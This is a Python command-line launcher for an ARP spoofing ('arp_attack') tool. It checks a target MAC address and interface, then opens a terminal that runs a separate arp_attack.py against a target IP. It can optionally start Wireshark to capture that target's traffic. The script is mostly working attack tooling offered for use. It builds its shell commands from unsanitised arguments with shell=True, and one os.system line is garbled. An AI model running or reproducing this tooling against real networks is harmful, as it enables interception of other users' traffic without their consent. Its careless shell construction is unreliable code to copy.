#!/usr/bin/env python


import argparse
import subprocess
import sys
import os
import time 

from subprocess import Popen, PIPE, check_output 
class Controll :

        def __init__(self):
            self.arg_pares_on()
            self.start()
        def start(self): 
               if len(self.args.dest) == 17 and ":" in self.args.dest:
                     pass       
               else:
                     print('\n'+"*"*22)
                     print("[*] Attck Status\n"+'*'*22)
                     time.sleep(0.30)
                     print("[*] Error   -----------------|->  MAC-address Error " )
                     exit()
               with open ('/proc/net/arp','r') as geteway :
                    router= geteway.readlines()
                    router = str("".join(router)).replace('\n',' ')

               if (str(self.args.Interface))  not in  router :
                    print('\n'+"*"*22)
                    print("[*] Attck Status\n"+'*'*22)
                    time.sleep(0.30)
                    print("[*] Error    -----------------|-> Interface not Found "  )
                    exit()    
               else:
                   pass       
               if self.args.repate:
                    args = '-I '+self.args.Interface+' -T '+ self.args.Target +' -M ' +self.args.dest +' -R '+ self.args.repate+' '
               else:
                    args = "-I "+self.args.Interface+" -T "+ self.args.Target +" -M " +self.args.dest 
               command_proc = 'gnome-terminal  -e ' +'"'+' ./Packagearp/arp_attack.py ' + args +'"'                  
               call_termminal = subprocess.call(command_proc,shell=True,stderr=subprocess.PIPE)   
                
               if self.args.Wireshark :

                  if not os.path.exists("./capture"):
                     os.mkdir("./capture")
                  if os.path.exists("./capture/"+self.args.Target):
                     os.remove("./capture/"+self.args.Target)
                  os.chown("./capture",0, 0)
                  self.CommandWireShark= "wireshark -i "+self.args.Interface+" -k "+"-Y ip.addr=="+self.args.Target+ " -S -N 'mnNdtv'  -w ./capture/"+self.args.Target+"  2>/dev/null" 
                  os.system(self.CommandWireShark)
                  os.system("./capture/"+self.CommandWireShark)
                  id_user =  os.stat("./arpattack.py").st_uid
                  os.chown("./capture", id_user, id_user)
                  os.chown("./capture/"+self.args.Target, id_user, id_user)
        def arg_pares_on(self):
            parser = argparse.ArgumentParser( description="Usage: <OPtion> <arguments> ")          
            parser.add_argument( '-I',"--Interface"  ,dest = "Interface" ,required=True   , action=None )
            parser.add_argument( '-M',"--dest"       ,dest = "dest"      ,required=True   , action=None )
            parser.add_argument( '-T',"--Target"     ,dest = "Target"    ,required=True   , action=None )
            parser.add_argument( '-R',"--repate"     ,dest = "repate"    ,required=False  , action=None )
            parser.add_argument( '-W',"--Wireshark"  ,dest = "Wireshark" ,required=False  , action=None)
            self.args = parser.parse_args()
            if len(sys.argv)> 1 :
               pass
            else:
               parser.print_help()
               exit()  
if __name__=='__main__':
     Controll()
  
       

